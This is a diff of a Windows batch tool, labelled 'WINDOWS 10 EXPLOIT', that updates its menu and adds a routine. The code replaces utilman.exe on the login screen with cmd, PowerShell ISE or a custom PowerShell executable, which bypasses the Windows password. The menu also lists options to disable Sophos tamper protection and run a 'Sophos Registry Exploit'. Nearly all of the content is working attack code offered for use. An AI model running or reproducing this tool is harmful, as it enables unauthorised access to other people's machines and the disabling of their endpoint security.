@@ -33,37 +33,38 @@ echo ^|==================================^|
 echo ^|  WINDOWS 10 EXPLOIT BY Viren070  ^|
 echo ^|   ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~    ^| 
 echo ^|                                  ^|
-echo ^|    BUILD ^| Production 23.9.2     ^|
-echo ^|==================================^| & echo: & echo:
+echo ^|    BUILD ^| Production 23.9.3     ^|
+echo ^|==================================^| & echo: & echo: & echo:
 
-echo +++++ Password Exploit
-echo ^[1^] Local Password Exploit
-echo ^[2^] Local Password Exploit  ^- PowerShell method
-echo ^[3^] Undo Password Exploit
-echo ^[4^] Restore Original Files
+echo +++++ Accessibility Menu Exploit
+echo ^[1^] Replace with CMD
+echo ^[2^] Replace with Powershell ISE
+echo ^[3^] Replace with PowerShell script to create FirewallUtility
+echo ^[4^] Undo Password Exploit
+echo ^[5^] Restore Original Files
 
 echo: & echo +++++ Sophos Exploit
-echo ^[5^] Disable Sophos Tamper Protection
-echo ^[6^] Sophos Registry Exploit
+echo ^[6^] Disable Sophos Tamper Protection
+echo ^[7^] Sophos Registry Exploit
 
 echo: & echo +++++ Other
-echo ^[7^] Show On-Screen Keyboard
+echo ^[8^] Show On-Screen Keyboard
 echo: & echo +++++ Exit
 echo ^[0^] Exit
 echo: & echo: & echo:
 
-set validOptions=0 1 2 3 4 5 6 7
+set validOptions=0 1 2 3 4 5 6 7 8
 set "crackType="
 set /p "crackType=^>"
 
-set optionFound=false
+set "optionFound=0"
 for %%a in (!validOptions!) do (
   if "!crackType!"=="%%a" (
-    set optionFound=true
+    set "optionFound=1"
   )
 )
 
-if not !optionFound!==true (
+if !optionFound! EQU 0 (
   color 0C
   cls
   call :showDinoError
@@ -71,6 +72,7 @@ if not !optionFound!==true (
   timeout /t 5 
   goto menu
 )
+
 if "!crackType!" EQU "0" (
   color 07
   cls & echo Exiting...
@@ -81,25 +83,30 @@ if "!crackType!" EQU "1" (
   call :local-password-exploit
 )
 
-IF "!crackType!" EQU "2" (
+if "!crackType!" EQU "2" (
   call :local-password-exploit-powershell
 )
+
 if "!crackType!" EQU "3" (
-  call :undo-password-exploit
+  call :local-password-exploit-powershell-script
 )
 
 if "!crackType!" EQU "4" (
-  call :restore-original-files
+  call :undo-password-exploit
 )
 
 if "!crackType!" EQU "5" (
+  call :restore-original-files
+)
+
+if "!crackType!" EQU "6" (
   call :disable-sophos-tamper-protection
 )
-if "!crackType!" EQU "6" (
+if "!crackType!" EQU "7" (
   call :sophos-registry-exploit
 )
 
-if "!crackType!" EQU "7" (
+if "!crackType!" EQU "8" (
   echo Running OSK.exe...
   start "" "C:\windows\system32\osk.exe" || goto :cmdFail
   color 0A
@@ -159,19 +166,58 @@ set "PowershellPath=C:\Windows\System32\WindowsPowershell\v1.0\powershell_ise.ex
 
 if exist "%UtilmanOldPath%" (
   echo Deleting existing utilman.old
-  del "%UtilmanOldPath%"
+  del "%UtilmanOldPath%" || goto :cmdFail
 )
 
 if exist "%UtilmanPath%" (
   echo Renaming utilman.exe to utilman.old 
-  ren "%UtilmanPath%" utilman.old 
+  ren "%UtilmanPath%" utilman.old || goto :cmdFail
   echo. 
   echo Copying powershell.exe to utilman.exe 
-  copy "%PowershellPath%" "%UtilmanPath%"
+  copy "%PowershellPath%" "%UtilmanPath%" || goto :cmdFail
 ) else (
   call :showDinoError
   echo Utilman.exe not found in the specified path: "%UtilmanPath%"
   echo Failing exploit and returning to menu
+  timeout /t 5 
+  goto menu 
+)
+
+echo -----------------------------------
+color 0A
+echo Exploit Completed ^| No errors
+pause
+goto menu
+
+:local-password-exploit-powershell-script 
+cls
+echo Starting Hack...
+echo. 
+set "UtilmanPath=C:\Windows\System32\utilman.exe"
+set "UtilmanOldPath=C:\Windows\System32\utilman.old"
+set "PowerShellScriptPath=X:\sources\PowerShell_Script.exe"
+
+if exist "%UtilmanOldPath%" (
+  echo Deleting existing utilman.old
+  del "%UtilmanOldPath%" || goto :cmdFail
+)
+if not exist "%PowerShellScriptPath%" (
+  call :showDinoError
+  echo PowerShell_Script.exe not found. 
+  echo Failing exploit and returning to Menu
+  timeout /t 5 
+  goto menu
+)
+if exist "%UtilmanPath%" (
+  echo Renaming utilman.exe to utilman.old 
+  ren "%UtilmanPath%" utilman.old || goto :cmdFail
+  echo. 
+  echo Copying powershell script exe to utilman.exe 
+  copy "%PowerShellScriptPath%" "%UtilmanPath%" || goto :cmdFail
+) else (
+  call :showDinoError
+  echo Utilman.exe not found in the specified path: "%UtilmanPath%"
+  echo Failing script exploit and returning to menu
   timeout /t 5 
   goto menu 
 )
